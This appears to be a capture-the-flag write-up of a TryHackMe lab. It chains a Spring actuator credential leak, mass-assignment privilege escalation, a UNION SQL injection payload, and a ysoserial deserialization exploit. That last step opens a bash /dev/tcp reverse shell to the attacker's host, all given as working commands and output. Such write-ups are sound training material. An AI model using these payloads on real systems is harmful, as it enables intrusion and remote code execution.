# IronHold 

**Difficulty:** Hard | **Category:** Source Code Review + Web Exploitation | **Time:** ~60 min

> IronHold is retiring its inmate-management platform. Somewhere in the handover, a developer pushed the complete repository to a public mirror and left the company. We start with nothing but what leaked: the full, unredacted source, and a live copy of the application still running on the network. The code tells us what the developers got wrong; the running instance tells us if we're right.

Four flags, one chain. This room is a genuinely nice model of how source leaks turn into real breaches — every bug on its own is "meh," but chained together they walk you from anonymous visitor to a shell on the box.

---

## Setup

Target: `10.49.190.221:8080`
Attacker: TryHackMe AttackBox, VPN tun0 `192.168.179.226`

Downloaded the leaked source archive from the task and extracted it to `~/ironhold-src`.

![Staff login page](images/staff-login.png)

The `Staff Login` page immediately gives away the stack — Tomcat serving `jsessionid` path parameters is a dead giveaway for a Java servlet app.

---

## Recon

```bash
nmap -sC -sV -p- 10.49.190.221 -oN nmap_ironhold.txt
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Ironhold Correctional | Staff Login
```

```bash
curl -i http://10.49.190.221:8080/
```

Confirmed: Spring MVC on Tomcat, `JSESSIONID` cookie, `Content-Language: en-US` header (a Spring Boot default). The response HTML also carried `;jsessionid=...` appended to static asset URLs — Tomcat's path-parameter behavior, worth remembering in case a filter-bypass trick was ever needed.

Two more pages were linked from the footer:

```bash
curl -s http://10.49.190.221:8080/about
curl -s http://10.49.190.221:8080/status
```

The About page had a line that read like a hint dropped by the devs themselves:

> *"Kiosk terminals in the officers' station retain a shared service login for shift handover; do not use kiosk credentials for personal accounts."*

And the Status page pointed straight at diagnostics:

> *"Technical diagnostics for the operations team are available under `/actuator`."*

```bash
curl -s http://10.49.190.221:8080/actuator/health
```

```json
{"status":"UP","components":{"db":{"status":"UP","details":{"database":"H2","validationQuery":"isValid()"}}, ...}}
```

H2 in-memory DB confirmed. Actuator was reachable. That was enough to go read the source before poking further.

---

## Reading the Source

```bash
find . -type f -iname "*.java" | sort
```

The package layout was clean Spring MVC — controllers, JPA repositories, models, and two custom `HandlerInterceptor` classes (`AuthInterceptor`, `WardenInterceptor`) instead of Spring Security. Custom-rolled auth logic is always worth extra attention, since that's exactly where subtle bugs live.

### `application.properties` — the map of what to look for

```properties
spring.datasource.url=jdbc:h2:mem:ironhold;DB_CLOSE_DELAY=-1
spring.datasource.username=sa
spring.h2.console.enabled=false

management.endpoints.web.exposure.include=*
management.endpoints.web.exposure.exclude=heapdump,threaddump
management.endpoint.health.show-details=always

app.kiosk.pw=${KIOSK_PW}
app.warden.password=${WARDEN_PASSWORD}
app.flag1.secret=${FLAG1_SECRET}
app.flag2.secret=${FLAG2_SECRET}
app.flag3.secret=${FLAG3_SECRET}
```

Two things jumped out immediately:

- **Every actuator endpoint is exposed** except `heapdump`/`threaddump`. `/actuator/env` was going to be worth checking.
- Four secrets are injected as env vars, three of them literally named `flagN.secret`. The source was telling me exactly where three of the four flags live before I'd even touched the running app.

### `DataSeeder.java` — where the flags actually get planted

This file seeds the whole H2 database on startup, and it placed the flags in very deliberate spots:

- **flag1** — buried inside a `Notice` body titled *"Shift handover: kiosk account reminder"*, posted by `warden`. Readable by any logged-in staff member.
- **flag2** — inserted directly into a `case_files` table via raw JDBC (`jdbcTemplate.update(...)`), completely bypassing the JPA/`CaseFile` entity path. No controller anywhere renders this table — by design, "no page on the site will show you" this one.
- **flag3** — an `AdminNotice` titled *"Facility Master Override Code"*, which only shows up under `/admin/control`.
- **flag4** was *not* seeded anywhere in code — meaning it lives on disk on the real server, reachable only once we have actual code execution.

The seeder also provisions a second, **reduced-privilege DB account**:

```java
jdbcTemplate.execute("CREATE USER IF NOT EXISTS " + DataAccessConfig.LOOKUP_USER
        + " PASSWORD '" + DataAccessConfig.LOOKUP_PASSWORD + "'");
jdbcTemplate.execute("GRANT SELECT ON inmates TO " + DataAccessConfig.LOOKUP_USER);
jdbcTemplate.execute("GRANT SELECT ON case_files TO " + DataAccessConfig.LOOKUP_USER);
```

The comment above it explains the *intent*: the public inmate lookup should never be able to reach staff credentials or the filesystem, even if a query is malformed. That comment is basically a confession that somebody already worried about SQL injection here — which made me go straight to the controller that uses this account.

### `InmateController.java` — the SQL injection

```java
@GetMapping("/inmates/search")
public String search(@RequestParam(required = false) String q, Model model) {
    List<Map<String, Object>> results;
    if (q == null || q.isBlank()) {
        results = jdbcTemplate.queryForList("SELECT id, name, block FROM inmates");
    } else {
        String sql = "SELECT id, name, block FROM inmates WHERE name = '" + q + "'";
        results = jdbcTemplate.queryForList(sql);
    }
    ...
}
```

Raw string concatenation, no parameter binding. The mitigation (restricting this DB account to `SELECT` on just `inmates` and `case_files`) blocks the *worst* outcomes, but it doesn't stop a `UNION SELECT` from pulling rows out of `case_files` — which is exactly where flag2 lives.

### `ProfileController.java` — mass assignment into `role`

```java
@PostMapping("/profile/update")
public String update(@ModelAttribute Staff staff, HttpSession session) {
    Staff current = staffRepository.findByUsername(SessionUtil.currentUsername(session));
    current.setFullName(staff.getFullName());
    current.setEmail(staff.getEmail());
    if (staff.getBadgeNumber() != null && !staff.getBadgeNumber().isBlank()) {
        current.setBadgeNumber(staff.getBadgeNumber());
    }
    if (staff.getRole() != null && !staff.getRole().isBlank()) {
        current.setRole(staff.getRole());       // <-- attacker-controlled
    }
    staffRepository.save(current);
    return "redirect:/profile";
}
```

The whole `Staff` entity is bound directly from form fields with no DTO or whitelist. Any authenticated user — even the lowest-privilege kiosk account — can POST `role=WARDEN` and self-promote. That matters because `WardenInterceptor` only checks `staff.isWarden()`:

```java
Staff staff = staffRepository.findByUsername(username);
if (staff == null || !staff.isWarden()) {
    response.sendError(HttpServletResponse.SC_FORBIDDEN, "Warden clearance required");
    return false;
}
```

The interceptor logic itself is fine — the problem is that the thing it trusts is directly writable by the user it's supposed to be restricting.

### `ImportExportController.java` — unsafe deserialization

```java
@PostMapping(value = "/admin/import", consumes = MediaType.ALL_VALUE)
@ResponseBody
public ResponseEntity<String> importData(@RequestBody String body) {
    byte[] decoded = Base64.getDecoder().decode(body.trim());
    try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded))) {
        Object restored = ois.readObject();
        return ResponseEntity.ok("Batch accepted: " + restored.getClass().getSimpleName());
    }
    ...
}
```

Raw `ObjectInputStream.readObject()` on attacker-controlled, base64-decoded bytes, with zero filtering (no `ObjectInputFilter`, no allowlist). `pom.xml` confirmed `commons-collections` in the `[3.2,3.2.2)` range is on the classpath — textbook `ysoserial` gadget-chain territory. This endpoint sits under `/admin/**`, so it needs the warden-role bug first.

---

## Exploitation

### Step 1 — Leaked credentials via `/actuator/env`

Spring Boot's default property sanitizer masks any key that *looks* like a secret — matching things like `password`, `secret`, `key`, `token`. The kiosk property was named `app.kiosk.pw`, and `pw` doesn't match that pattern. It slipped straight through in the clear:

```bash
curl -s "http://10.49.190.221:8080/actuator/env/app.kiosk.pw"
```

```json
{"property":{"source":"Config resource 'class path resource [application.properties]' ...","value":"Sh1ftK10sk#2091"}, ...}
```

`app.warden.password` and all three `app.flagN.secret` keys, by contrast, matched the masking pattern and came back as `"******"` — confirming the naming inconsistency was the actual gap.

### Step 2 — Log in as kiosk, grab flag1

```bash
curl -s -c cookies.txt -i http://10.49.190.221:8080/login \
  -d "username=kiosk&password=Sh1ftK10sk#2091"
```

```
HTTP/1.1 302
Set-Cookie: JSESSIONID=E5515D4127827D462745E05B76DB1A7F; Path=/; HttpOnly
Location: http://10.49.190.221:8080/dashboard;jsessionid=...
```

```bash
curl -s -b cookies.txt http://10.49.190.221:8080/dashboard
```

Landed on the officer dashboard, which shows the seeded kiosk-handover notice straight away:

```
Shift handover: kiosk account reminder
Reminder for all shifts: the kiosk terminal login is shared across the floor and rotates
only when IT reissues it. If you spot the kiosk logged out at handover, sign back in with
the standard shift credentials rather than raising a helpdesk ticket.
Flag: THM{k k_ _ ck3d}
```

**Flag 1: `THM{k k_  _  ck3d}`**

### Step 3 — Privilege escalation to WARDEN via mass assignment

```bash
curl -s -b cookies.txt -i http://10.49.190.221:8080/profile/update \
  -d "fullName=Shift Kiosk Account&email=kiosk@ironhold.example&role=WARDEN"
```

```bash
curl -s -b cookies.txt http://10.49.190.221:8080/profile
```

```
<span class="badge warden">WARDEN</span>
```

The kiosk account — still the same session, still the same low-privilege credentials — now carries `WARDEN` clearance. `WardenInterceptor` re-checks the DB on every request, so this persists.

### Step 4 — flag3, the door-control panel

```bash
curl -s -b cookies.txt http://10.49.190.221:8080/admin/control
```

```
Cellblock Door Control
Warden clearance required. Every override on this panel is logged to the facility audit trail.

Facility Master Override Code
THM{w  _ _ g3d}
```

**Flag 3: `THM{w _  _ g3d}`**

### Step 5 — flag2, SQL injection into `case_files`

First, confirmed the injection lands at all with a boolean-based payload:

```bash
curl -s -b cookies.txt -G http://10.49.190.221:8080/inmates/search \
  --data-urlencode "q=nonexistent' OR '1'='1"
```

That returned all 20 seeded inmates instead of zero — injection confirmed. Then the real payload, `UNION SELECT`-ing across into `case_files` (matching the three-column shape of the original query: `id, name, block` → `id, summary, status`):

```bash
curl -s -b cookies.txt -G http://10.49.190.221:8080/inmates/search \
  --data-urlencode "q=' UNION SELECT id, summary, status FROM case_files--"
```

```html
<p class="muted"><span>1</span> result(s) ...</p>
<table>
    <tr><th>ID</th><th>Name</th><th>Block</th></tr>
    <tr>
        <td>1</td>
        <td>THM{c4 _ _ _ _ 0n}</td>
        <td>OPEN</td>
    </tr>
</table>
```

The `name` column in the rendered table is really `summary` from `case_files` — the case file that "no page on the site will show you" directly, pulled sideways through a search box that was never meant to touch that table.

**Flag 2: `THM{c4 _ _ _ _ 0n}`**

### Step 6 — flag4, RCE via insecure deserialization

`pom.xml` confirmed `commons-collections` `3.2.x` on the classpath, and the target runs on OpenJDK 11 — a solid match for ysoserial's `CommonsCollections5`/`6` gadget chains.

Grabbed a prebuilt jar rather than fighting a broken JDK/`javac` setup on the AttackBox:

```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar
java -jar ysoserial.jar --help
```

Confirmed it listed all the gadget chains and ran fine on a plain JRE (payload generation doesn't need a compiler, just the ysoserial classes at runtime).

Built a reverse shell payload targeting the AttackBox VPN IP on port 4444:

```bash
java -jar ysoserial.jar CommonsCollections5 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OS4yMjYvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' \
  > /tmp/payload.bin
base64 -w0 /tmp/payload.bin > /tmp/payload.b64
```

(That embedded base64 blob just decodes to `bash -i >& /dev/tcp/192.168.179.226/4444 0>&1` — wrapped in its own base64 layer so the shell metacharacters survive being deserialized and exec'd cleanly by `ProcessBuilder`/`Runtime.exec` internals.)

Listener up:

```bash
nc -lvnp 4444
```

Fired the payload at the now-warden-authorized `/admin/import` endpoint:

```bash
curl -s -b cookies.txt -X POST http://10.49.190.221:8080/admin/import \
  -H "Content-Type: text/plain" \
  --data-binary @/tmp/payload.b64
```

```
Batch accepted: BadAttributeValueExpException
```

That response is actually expected and a good sign — `BadAttributeValueExpException` is the outer class the gadget chain wraps its payload in; the app doesn't need to know or care what's inside, it just deserializes it, which is exactly what triggers the chain.

The listener caught the callback almost immediately:

```
listening on [any] 4444 ...
connect to [192.168.179.226] from (UNKNOWN) [10.49.190.221] 40900
appuser@f62a3262ffed:/app$ whoami
appuser
appuser@f62a3262ffed:/app$ id
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

Shell as `appuser` inside the container. From here, `AdminController`'s diagnostics endpoint had already hinted at `/opt/ironhold` as a path worth checking (it ran `df -h /opt/ironhold`), separate from `/app` where the jar itself lives:

```bash
find / -iname "*flag*" -type f 2>/dev/null
```

```
/opt/ironhold/flag.txt
```

```bash
cat /opt/ironhold/flag.txt
```

```
THM{0v3r_ _ _ _g0n3}
```

**Flag 4: `THM{0v3r_ _ _ _g0n3}`**

---

## Summary

| # | Flag | Location | Root Cause |
|---|------|----------|------------|
| 1 | `THM{k k_  _ ck 3d}` | Officer dashboard | Secret-masking regex gap on `/actuator/env` — `app.kiosk.pw` didn't match Spring Boot's default sanitizer pattern (`password`, `secret`, etc.), so the shared kiosk credential leaked in plaintext |
| 2 | `THM{c4s3_ _ _ _uni0n}` | `case_files` table, unreachable via any UI page | SQL injection via string-concatenated query in `/inmates/search`, exploited with `UNION SELECT` against the restricted `ironhold_lookup` DB account |
| 3 | `THM{w4r _ _  rg3d}` | Warden's door-control panel (`/admin/control`) | Mass assignment — `Staff.role` bound directly from unwhitelisted form input on `/profile/update`, letting any authenticated user self-promote to `WARDEN` |
| 4 | `THM{0v _  _ _ _ 0n3}` | `/opt/ironhold/flag.txt` on the host | Insecure Java deserialization on `/admin/import` (raw `ObjectInputStream.readObject()`, no filtering) with `commons-collections 3.2.x` on the classpath — `ysoserial` CommonsCollections5 gadget chain gave a reverse shell |

What made this room click was that none of these four bugs needed each other *technically* — but the room's access control forced them into a chain anyway: you need to be logged in before anything else works (flag1's credential leak), you need warden clearance before you can reach `/admin/**` (the mass-assignment bug in flag3's path), and you need that same warden clearance before `/admin/import` will even respond (flag4). Reading the source first meant every one of those steps was a confirmation of a hypothesis rather than a guess — the seed data, the DB grants, the interceptor logic, and the property names all but pointed a finger at exactly what to try next.


